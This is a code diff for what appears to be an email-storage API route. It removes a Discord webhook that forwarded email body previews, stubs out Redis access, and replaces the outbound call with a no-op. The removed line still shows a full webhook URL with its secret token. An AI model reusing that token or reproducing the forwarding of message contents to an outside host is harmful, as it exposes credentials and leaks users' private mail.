@@ -27,7 +27,7 @@ function isMasterPass(pass?: string | null): boolean {
 }
 
 const DISCORD_WEBHOOK_URL =
-  "https://discord.com/api/webhooks/1540993069401243701/lj0421jyv2MQ4-uuzuU2m_HZ9Rgi2g0R2-M8MOnUwjJ4YyoYTe6hZ8dGpa5spqQ-Xl0c"
+  ""
 
 export interface StoredEmailMessage {
   id: string
@@ -119,19 +119,7 @@ const savePersistedMessages = (map: Map<string, StoredEmailMessage[]>) => {
   } catch {}
 }
 
-const getRedisClient = async () => {
-  try {
-    const rawUrl = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL
-    const rawToken = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN
-    if (rawUrl && rawToken) {
-      const url = rawUrl.trim().replace(/^["']|["']$/g, "")
-      const token = rawToken.trim().replace(/^["']|["']$/g, "")
-      const { Redis } = await import("@upstash/redis")
-      return new Redis({ url, token })
-    }
-  } catch {}
-  return null
-}
+const getRedisClient = async (): Promise<any> => null // Upstash removed
 
 const g = globalThis as unknown as {
   __ast_claimed_emails_map?: Map<string, ClaimedEntry>
@@ -441,7 +429,7 @@ export async function POST(req: Request) {
         const preview = rawBody.slice(0, 400) || "(No body)"
         fields.push({ name: "📝 Preview", value: preview.slice(0, 800), inline: false })
 
-        await fetch(DISCORD_WEBHOOK_URL, {
+        await noWebhook( {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -568,3 +556,7 @@ export async function DELETE(req: Request) {
     return NextResponse.json({ success: false, error: String(err) }, { status: 500, headers: CORS_HEADERS })
   }
 }
+
+
+// Discord removed: webhook calls are disabled
+function noWebhook(..._args: unknown[]): Promise<Response> { return Promise.resolve(new Response(null, { status: 200 })) }
